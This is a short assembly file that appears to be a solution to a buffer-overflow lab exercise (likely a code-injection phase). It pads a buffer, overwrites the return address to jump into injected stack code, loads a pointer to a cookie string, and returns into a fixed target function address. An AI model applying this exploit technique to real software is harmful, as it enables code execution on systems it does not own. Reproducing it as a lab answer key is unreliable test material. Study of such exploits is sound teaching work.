BASE = 0x5561dc78

stack:
  .ascii "0123456789012345678901234567890123456789"
  .quad (BASE + main - stack)

main:
  movl $(BASE + cookie - stack), %edi
  push $0x4018fa
  ret

cookie:
  .asciz "59b997fa"
